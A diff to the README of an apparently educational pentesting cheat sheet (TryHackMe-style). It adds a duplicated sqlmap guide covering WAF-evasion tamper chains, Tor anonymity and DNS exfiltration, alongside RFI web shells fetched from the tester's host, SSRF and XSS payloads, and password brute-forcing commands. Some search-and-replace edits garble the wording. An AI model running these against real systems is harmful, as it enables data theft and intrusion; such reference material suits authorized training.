@@ -43,9 +43,9 @@ This repository contains a collection of commands and notes for reconnaissance, 
 ### Example Commands
 ```bash
 # Nmap Scan
-nmap -sC -sV -A -T4 target
+nmap -sC -sV -A -T4 domain
 # Rustscan Fast Port Scan
-rustscan -a target -- -sV -O
+rustscan -a domain -- -sV -O
 # DNS Queries
 dig domain.com
 nslookup domain.com
@@ -92,8 +92,74 @@ dig axfr @ns1.domain.com domain.com
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://domain.com/FUZZ
 # Directory Brute-Forcing with gobuster
 gobuster dir -u http://domain.com -w /usr/share/wordlists/dirb/common.txt
-# SQL Injection with sqlmap
-sqlmap -u "http://domain.com/page?id=1" --dbs
+
+### sqlmap 𝗕𝗔𝗦𝗜𝗖 𝗨𝗦𝗔𝗚𝗘
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --batch
+```
+
+### 𝗘𝗡𝗨𝗠𝗘𝗥𝗔𝗧𝗘 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘𝗦
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --dbs
+```
+
+### 𝗘𝗡𝗨𝗠𝗘𝗥𝗔𝗧𝗘 𝗧𝗔𝗕𝗟𝗘𝗦
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" -D database_name --tables
+```
+
+### 𝗘𝗡𝗨𝗠𝗘𝗥𝗔𝗧𝗘 𝗖𝗢𝗟𝗨𝗠𝗡𝗦
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" -D database_name -T table_name --columns
+```
+
+### 𝗗𝗨𝗠𝗣 𝗧𝗔𝗕𝗟𝗘 𝗗𝗔𝗧𝗔
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" -D database_name -T table_name --dump
+```
+
+### 𝗕𝗬𝗣𝗔𝗦𝗦 𝗪𝗔𝗙 / 𝗙𝗜𝗟𝗧𝗘𝗥𝗦
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --tamper=between,charencode,randomcase,space2comment,versionedmorekeywords
+```
+Use multiple tamper scripts to evade security filters and bypass WAFs. You can chain them together.
+
+### 𝗢𝗕𝗙𝗨𝗦𝗖𝗔𝗧𝗘 𝗣𝗔𝗬𝗟𝗢𝗔𝗗𝗦
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --prefix="%00" --suffix="--+" --tamper=space2comment
+```
+
+### 𝗖𝗨𝗦𝗧𝗢𝗠 𝗥𝗘𝗫𝗨𝗘𝗦𝗧 + 𝗕𝗨𝗥𝗣
+```bash
+sqlmap -r request.txt --batch --random-agent --level=5 --risk=3 --tamper=charencode,randomcase
+```
+
+### 𝗖𝗨𝗦𝗧𝗢𝗠 𝗛𝗘𝗔𝗗𝗘𝗥𝗦 + 𝗖𝗢𝗢𝗞𝗜𝗘𝗦
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --cookie="PHPSESSID=abc123" --headers="X-Forwarded-For: 127.0.0.1"
+```
+
+### 𝗧𝗜𝗠𝗘-𝗕𝗔𝗦𝗘𝗗 𝗕𝗟𝗜𝗡𝗗 𝗜𝗡𝗝𝗘𝗖𝗧𝗜𝗢𝗡
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --technique=T --time-sec=10 --tamper=space2comment
+```
+
+### 𝗗𝗘𝗘𝗣 𝗦𝗖𝗔𝗡 + 𝗠𝗔𝗫 𝗢𝗕𝗙𝗨𝗦𝗖𝗔𝗧𝗜𝗢𝗡
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --tamper=between,charencode,randomcase,space2comment,apostrophemask --level=5 --risk=3 --threads=5 --batch
+```
+
+### 𝗨𝗦𝗘 𝗧𝗢𝗥 𝗙𝗢𝗥 𝗔𝗡𝗢𝗡𝗬𝗠𝗜𝗧𝗬
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --tor --tor-type=SOCKS5 --check-tor
+```
+
+### 𝗗𝗡𝗦 𝗘𝗫𝗙𝗜𝗟𝗧𝗥𝗔𝗧𝗜𝗢𝗡
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --dns-domain=http://yourdomain.com
+```
+Use this in blind SQLi when you control the DNS server.
+
 # XSS Testing with dalfox
 dalfox url http://domain.com
 # XSS Testing with xsstrike
@@ -199,20 +265,20 @@ returnToReturnTo=
 return_to_return_to=
 returnToReturnToUrl=
 return_to_return_to_url=
-returnToReturnToReturnToPath=
-return_to_return_to_return_to_path=
-returnToReturnToReturnToUri=
-return_to_return_to_return_to_uri=
-returnToReturnToReturnToDest=
-return_to_return_to_return_to_dest=
-returnToReturnToReturnToRedirect=
-return_to_return_to_return_to_redirect=
-returnToReturnToReturnToContinue=
-return_to_return_to_return_to_continue=
-returnToReturnToReturnToReturn=
-return_to_return_to_return_to_return=
-returnToReturnToReturnToReturnTo=
-return_to_return_to_return_to_return_to=
+returnToReturnToPath=
+return_to_return_to_path=
+returnToReturnToUri=
+return_to_return_to_uri=
+returnToReturnToDest=
+return_to_return_to_dest=
+returnToReturnToRedirect=
+return_to_return_to_redirect=
+returnToReturnToContinue=
+return_to_return_to_continue=
+returnToReturnToReturn=
+return_to_return_to_return=
+returnToReturnToReturnTo=
+return_to_return_to_return_to=
 ```
 
 #### Common SSRF Payloads
@@ -290,15 +356,15 @@ http://017700000001
 2. **Using curl**
 ```bash
 # Test basic SSRF
-curl -v "http://target.com/page?url=http://localhost"
+curl -v "http://domain.com/page?url=http://localhost"
 
 # Test with different protocols
-curl -v "http://target.com/page?url=file:///etc/passwd"
-curl -v "http://target.com/page?url=dict://localhost:11211/stat"
-curl -v "http://target.com/page?url=gopher://localhost:11211/_stats"
+curl -v "http://domain.com/page?url=file:///etc/passwd"
+curl -v "http://domain.com/page?url=dict://localhost:11211/stat"
+curl -v "http://domain.com/page?url=gopher://localhost:11211/_stats"
 
 # Test with different encodings
-curl -v "http://target.com/page?url=http://%6c%6f%63%61%6c%68%6f%73%74"
+curl -v "http://domain.com/page?url=http://%6c%6f%63%61%6c%68%6f%73%74"
 ```
 
 3. **Using Python**
@@ -325,7 +391,7 @@ payloads = [
 ]
 
 for payload in payloads:
-    test_ssrf("http://target.com/page", payload)
+    test_ssrf("http://domain.com/page", payload)
 ```
 
 #### Mitigation Techniques
@@ -468,7 +534,7 @@ Remote File Inclusion (RFI) vulnerabilities allow attackers to include and execu
 
 **Example: Hosting a Malicious File for RFI Testing (Linux & Windows)**
 
-#### For Linux Targets (PHP Web Shell)
+#### For Linux domains (PHP Web Shell)
 1. Create a simple PHP web shell (e.g., `shell.txt`):
     ```php
     <?php system($_GET['cmd']); ?>
@@ -483,10 +549,10 @@ Remote File Inclusion (RFI) vulnerabilities allow attackers to include and execu
     ```
 4. To execute a command (e.g., `id`), visit:
     ```
-    http://target-victim/page.php?page=http://<your-ip>:9000/shell.txt&cmd=id
+    http://domain-victim/page.php?page=http://<your-ip>:9000/shell.txt&cmd=id
     ```
 
-#### For Windows Targets (ASPX Web Shell)
+#### For Windows domains (ASPX Web Shell)
 1. Create a simple ASPX web shell (e.g., `shell.aspx`):
     ```aspx
     <%@ Page Language="C#" %>
@@ -514,10 +580,10 @@ Remote File Inclusion (RFI) vulnerabilities allow attackers to include and execu
     ```
 4. To execute a command (e.g., `whoami`), visit:
     ```
-    http://target-victim/page.aspx?page=http://<your-ip>:9000/shell.aspx&cmd=whoami
+    http://domain-victim/page.aspx?page=http://<your-ip>:9000/shell.aspx&cmd=whoami
     ```
 
-> **Note:** Replace `<your-ip>` with your actual IP address accessible by the target. Make sure the target web application supports remote file inclusion and the relevant scripting language (PHP for Linux, ASPX for Windows).
+> **Note:** Replace `<your-ip>` with your actual IP address accessible by the domain. Make sure the domain web application supports remote file inclusion and the relevant scripting language (PHP for Linux, ASPX for Windows).
 
 ---
 
@@ -675,14 +741,14 @@ return_to_return_to_return_to_return_to=
 2. **Using curl**
 ```bash
 # Test basic XSS
-curl -v "http://target.com/page?search=<script>alert(1)</script>"
+curl -v "http://domain.com/page?search=<script>alert(1)</script>"
 
 # Test with different encodings
-curl -v "http://target.com/page?search=%3Cscript%3Ealert(1)%3C/script%3E"
-curl -v "http://target.com/page?search=&#60;script&#62;alert(1)&#60;/script&#62;"
+curl -v "http://domain.com/page?search=%3Cscript%3Ealert(1)%3C/script%3E"
+curl -v "http://domain.com/page?search=&#60;script&#62;alert(1)&#60;/script&#62;"
 
 # Test with different event handlers
-curl -v "http://target.com/page?search=<img src=x onerror=alert(1)>"
+curl -v "http://domain.com/page?search=<img src=x onerror=alert(1)>"
 ```
 
 3. **Using Python**
@@ -728,7 +794,7 @@ payloads = [
 ]
 
 for payload in payloads:
-    test_xss("http://target.com/page", payload)
+    test_xss("http://domain.com/page", payload)
 ```
 
 #### Mitigation Techniques
@@ -913,7 +979,7 @@ netstat -ano
 - Mitigation
 
 ### Time Management
-- Triage: Identify high-value targets first
+- Triage: Identify high-value domains first
 - Timebox: Don't get stuck—move on and return later
 - Document as you go
 
@@ -928,8 +994,8 @@ This section is a quick-access guide for the TryHackMe Junior Penetration Tester
 - **Passive Recon**: 
   - `theHarvester`, `whois`, `crt.sh`, `Shodan`, `Censys`
 - **Active Recon**:
-  - `nmap -sC -sV -A -T4 target`  # Service/version detection, OS detection
-  - `rustscan -a target -- -sV -O`  # Fast port scan
+  - `nmap -sC -sV -A -T4 domain`  # Service/version detection, OS detection
+  - `rustscan -a domain -- -sV -O`  # Fast port scan
   - `dig domain.com`, `nslookup domain.com`, `host domain.com`
   - **Banner Grabbing**: `nc -nv domain.com 80`, `telnet domain.com 80`
   - **DNS Zone Transfer**: `dig axfr @ns1.domain.com domain.com`
@@ -982,15 +1048,15 @@ wpscan --url http://domain.com --enumerate u,p
 ## Network Penetration Testing
 
 - **Service Enumeration**:
-  - **SMB**: `enum4linux -a target`, `smbclient -L //target/`
-  - **FTP**: `hydra -l user -P wordlist ftp://target`
-  - **SNMP**: `snmpwalk -v2c -c public target`
-  - **RDP**: `xfreerdp /u:user /p:pass /v:target`
+  - **SMB**: `enum4linux -a domain`, `smbclient -L //domain/`
+  - **FTP**: `hydra -l user -P wordlist ftp://domain`
+  - **SNMP**: `snmpwalk -v2c -c public domain`
+  - **RDP**: `xfreerdp /u:user /p:pass /v:domain`
 - **Password Attacks**: `hydra`, `medusa`, `crackmapexec`
 ```bash
-hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target
-medusa -u user -P /usr/share/wordlists/rockyou.txt -h target -M ssh
-crackmapexec smb target -u user -p /usr/share/wordlists/rockyou.txt
+hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://domain
+medusa -u user -P /usr/share/wordlists/rockyou.txt -h domain -M ssh
+crackmapexec smb domain -u user -p /usr/share/wordlists/rockyou.txt
 ```
 
 - **Traffic Sniffing**: `tcpdump -i eth0 -w capture.pcap`, `wireshark`, `mitmproxy`
@@ -1031,7 +1097,7 @@ mitmproxy -m transparent
   - Evidence (screenshots, output)
   - Mitigation
 - **Time Management**:
-  - Triage: Identify high-value targets first
+  - Triage: Identify high-value domains first
   - Timebox: Don't get stuck—move on and return later
   - Document as you go
 
@@ -1039,10 +1105,10 @@ mitmproxy -m transparent
 
 | Tool         | Purpose                        | Example Command                        |
 |--------------|-------------------------------|----------------------------------------|
-| nmap         | Port scanning                 | nmap -sC -sV -A -T4 target            |
+| nmap         | Port scanning                 | nmap -sC -sV -A -T4 domain            |
 | gobuster     | Directory brute-forcing       | gobuster dir -u URL -w wordlist       |
 | hydra        | Password brute-forcing        | hydra -l user -P passlist ssh://host  |
-| enum4linux   | SMB enumeration               | enum4linux -a target                  |
+| enum4linux   | SMB enumeration               | enum4linux -a domain                  |
 | bloodhound   | AD enumeration                | SharpHound.exe -c all                 |
 | sqlmap       | SQL injection                 | sqlmap -u URL --dbs                   |
 | linpeas      | Linux privesc                 | ./linpeas.sh > out.txt                |
@@ -1161,7 +1227,7 @@ curl wttr.in
 
 ---
 
-**Note**: Replace `domain.com` with the target domain and ensure you have authorization. Some commands require root privileges or specific tools installed. Save outputs to files (e.g., `nmap -oN output.txt`) for easier analysis.
+**Note**: Replace `domain.com` with the domain domain and ensure you have authorization. Some commands require root privileges or specific tools installed. Save outputs to files (e.g., `nmap -oN output.txt`) for easier analysis.
 
 # Banner Grabbing
 nc -nv domain.com 80
@@ -1228,8 +1294,8 @@ This section is a quick-access guide for the TryHackMe Junior Penetration Tester
 - **Passive Recon**: 
   - `theHarvester`, `whois`, `crt.sh`, `Shodan`, `Censys`
 - **Active Recon**:
-  - `nmap -sC -sV -A -T4 target`  # Service/version detection, OS detection
-  - `rustscan -a target -- -sV -O`  # Fast port scan
+  - `nmap -sC -sV -A -T4 domain`  # Service/version detection, OS detection
+  - `rustscan -a domain -- -sV -O`  # Fast port scan
   - `dig domain.com`, `nslookup domain.com`, `host domain.com`
   - **Banner Grabbing**: `nc -nv domain.com 80`, `telnet domain.com 80`
   - **DNS Zone Transfer**: `dig axfr @ns1.domain.com domain.com`
@@ -1264,10 +1330,10 @@ This section is a quick-access guide for the TryHackMe Junior Penetration Tester
 ## Network Penetration Testing
 
 - **Service Enumeration**:
-  - **SMB**: `enum4linux -a target`, `smbclient -L //target/`
-  - **FTP**: `hydra -l user -P wordlist ftp://target`
-  - **SNMP**: `snmpwalk -v2c -c public target`
-  - **RDP**: `xfreerdp /u:user /p:pass /v:target`
+  - **SMB**: `enum4linux -a domain`, `smbclient -L //domain/`
+  - **FTP**: `hydra -l user -P wordlist ftp://domain`
+  - **SNMP**: `snmpwalk -v2c -c public domain`
+  - **RDP**: `xfreerdp /u:user /p:pass /v:domain`
 - **Password Attacks**: `hydra`, `medusa`, `crackmapexec`
 - **Traffic Sniffing**: `tcpdump -i eth0 -w capture.pcap`, `wireshark`, `mitmproxy`
 
@@ -1302,7 +1368,7 @@ This section is a quick-access guide for the TryHackMe Junior Penetration Tester
   - Evidence (screenshots, output)
   - Mitigation
 - **Time Management**:
-  - Triage: Identify high-value targets first
+  - Triage: Identify high-value domains first
   - Timebox: Don't get stuck—move on and return later
   - Document as you go
 
@@ -1310,10 +1376,10 @@ This section is a quick-access guide for the TryHackMe Junior Penetration Tester
 
 | Tool         | Purpose                        | Example Command                        |
 |--------------|-------------------------------|----------------------------------------|
-| nmap         | Port scanning                 | nmap -sC -sV -A -T4 target            |
+| nmap         | Port scanning                 | nmap -sC -sV -A -T4 domain            |
 | gobuster     | Directory brute-forcing       | gobuster dir -u URL -w wordlist       |
 | hydra        | Password brute-forcing        | hydra -l user -P passlist ssh://host  |
-| enum4linux   | SMB enumeration               | enum4linux -a target                  |
+| enum4linux   | SMB enumeration               | enum4linux -a domain                  |
 | bloodhound   | AD enumeration                | SharpHound.exe -c all                 |
 | sqlmap       | SQL injection                 | sqlmap -u URL --dbs                   |
 | linpeas      | Linux privesc                 | ./linpeas.sh > out.txt                |
@@ -1335,5 +1401,79 @@ This section is a quick-access guide for the TryHackMe Junior Penetration Tester
 - [ ] Take notes/screenshots for every step
 - [ ] Prepare clear, concise report with evidence
 - [ ] Manage time—move on if stuck, revisit later
+
+---
+
+# SQL Injection with sqlmap
+sqlmap -u "http://domain.com/page?id=1" --dbs
+
+## SQLMap Comprehensive Guide
+
+### 𝗕𝗔𝗦𝗜𝗖 𝗨𝗦𝗔𝗚𝗘
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --batch
+```
+
+### 𝗘𝗡𝗨𝗠𝗘𝗥𝗔𝗧𝗘 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘𝗦
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --dbs
+```
+
+### 𝗘𝗡𝗨𝗠𝗘𝗥𝗔𝗧𝗘 𝗧𝗔𝗕𝗟𝗘𝗦
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" -D database_name --tables
+```
+
+### 𝗘𝗡𝗨𝗠𝗘𝗥𝗔𝗧𝗘 𝗖𝗢𝗟𝗨𝗠𝗡𝗦
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" -D database_name -T table_name --columns
+```
+
+### 𝗗𝗨𝗠𝗣 𝗧𝗔𝗕𝗟𝗘 𝗗𝗔𝗧𝗔
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" -D database_name -T table_name --dump
+```
+
+### 𝗕𝗬𝗣𝗔𝗦𝗦 𝗪𝗔𝗙 / 𝗙𝗜𝗟𝗧𝗘𝗥𝗦
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --tamper=between,charencode,randomcase,space2comment,versionedmorekeywords
+```
+Use multiple tamper scripts to evade security filters and bypass WAFs. You can chain them together.
+
+### 𝗢𝗕𝗙𝗨𝗦𝗖𝗔𝗧𝗘 𝗣𝗔𝗬𝗟𝗢𝗔𝗗𝗦
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --prefix="%00" --suffix="--+" --tamper=space2comment
+```
+
+### 𝗖𝗨𝗦𝗧𝗢𝗠 𝗥𝗘𝗫𝗨𝗘𝗦𝗧 + 𝗕𝗨𝗥𝗣
+```bash
+sqlmap -r request.txt --batch --random-agent --level=5 --risk=3 --tamper=charencode,randomcase
+```
+
+### 𝗖𝗨𝗦𝗧𝗢𝗠 𝗛𝗘𝗔𝗗𝗘𝗥𝗦 + 𝗖𝗢𝗢𝗞𝗜𝗘𝗦
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --cookie="PHPSESSID=abc123" --headers="X-Forwarded-For: 127.0.0.1"
+```
+
+### 𝗧𝗜𝗠𝗘-𝗕𝗔𝗦𝗘𝗗 𝗕𝗟𝗜𝗡𝗗 𝗜𝗡𝗝𝗘𝗖𝗧𝗜𝗢𝗡
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --technique=T --time-sec=10 --tamper=space2comment
+```
+
+### 𝗗𝗘𝗘𝗣 𝗦𝗖𝗔𝗡 + 𝗠𝗔𝗫 𝗢𝗕𝗙𝗨𝗦𝗖𝗔𝗧𝗜𝗢𝗡
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --tamper=between,charencode,randomcase,space2comment,apostrophemask --level=5 --risk=3 --threads=5 --batch
+```
+
+### 𝗨𝗦𝗘 𝗧𝗢𝗥 𝗙𝗢𝗥 𝗔𝗡𝗢𝗡𝗬𝗠𝗜𝗧𝗬
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --tor --tor-type=SOCKS5 --check-tor
+```
+
+### 𝗗𝗡𝗦 𝗘𝗫𝗙𝗜𝗟𝗧𝗥𝗔𝗧𝗜𝗢𝗡
+```bash
+sqlmap -u "http://domain.com/page.php?id=1" --dns-domain=http://yourdomain.com
+```
+Use this in blind SQLi when you control the DNS server.
 
 ---
